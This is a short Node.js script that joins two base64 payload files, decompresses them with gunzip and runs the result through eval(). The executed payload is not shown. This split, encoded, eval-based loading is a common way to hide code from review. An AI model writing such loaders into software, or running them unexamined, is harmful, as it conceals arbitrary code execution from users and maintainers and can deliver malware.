const fs=require('fs');
const zlib=require('zlib');
const path=require('path');
const b64=fs.readFileSync(path.join(__dirname,'payload.1.b64'),'utf8').trim()+fs.readFileSync(path.join(__dirname,'payload.2.b64'),'utf8').trim();
const source=zlib.gunzipSync(Buffer.from(b64,'base64')).toString('utf8');
eval(source);
